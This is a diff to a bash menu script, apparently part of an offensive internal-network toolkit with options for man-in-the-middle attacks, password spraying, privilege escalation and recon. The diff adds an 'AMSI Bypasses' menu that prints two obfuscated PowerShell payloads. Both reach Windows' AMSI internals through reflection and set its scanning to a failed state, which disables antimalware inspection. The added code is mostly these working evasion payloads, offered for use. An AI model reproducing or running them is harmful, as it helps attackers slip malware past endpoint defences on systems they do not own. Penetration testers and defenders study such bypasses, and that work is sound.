@@ -82,13 +82,16 @@ echo -ne " What would you like to do?
         3)  ->  [ Privilege Escalation	]
         4)  ->  [ Recon 		]
         
+        a) ->	[ AMSI Bypasses		]
+        
 "
         read a
         case $a in
-        	1) Internal_Menu_MiTM_Attacks ;;
-	        2) Internal_Menu_Password_Spraying ;;
-	        3) Internal_Menu_Privilege_Escalation ;;
-	        4) Internal_Menu_Recon ;;
+        	1) 	Internal_Menu_MiTM_Attacks ;;
+	        2) 	Internal_Menu_Password_Spraying ;;
+	        3) 	Internal_Menu_Privilege_Escalation ;;
+	        4) 	Internal_Menu_Recon ;;
+	        a|A)	Internal_Menu_AMSI_Bypasses ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -717,8 +720,40 @@ echo -e ""
 
 }
 
+Internal_Menu_AMSI_Bypasses(){
 
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}AMSI Bypasses${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Bypass #1${RESTORE}"
+echo -ne '
+$A="5492868772801748688168747280728187173688878280688776828"
+$B="1173680867656877679866880867644817687416876797271"
+[Ref]."A`ss`Embly"."GET`TY`Pe"([string](0..37|%{[char][int](29+($A+$B).
+substring(($_*2),2))})-replace " " ).
+GetField([string](38..51|%{[char][int](29+($A+$B).
+substring(($_*2),2))})-replace " ",'\'NonPublic,Static\'').
+SetValue($null,$true)
+'
+echo -e ""
+echo -e "${IBLUE}Bypass #2${RESTORE}"
+echo -ne '
+$A="5492868772801748688168747280728187173688878280688776"
+$B="8281173680867656877679866880867644817687416876797271"
+function C($n, $m){
+[string]($n..$m|%{[char][int](29+($A+$B).
+    substring(($_*2),2))})-replace " "}
+$k=C 0 37; $r=C 38 51
+$a=[Ref].Assembly.GetType($k)
+$a.GetField($r,'\'NonPublic,Static\'').SetValue($null,$true)
+'
+echo -e ""
 
+}
 
 
 Main_Menu(){
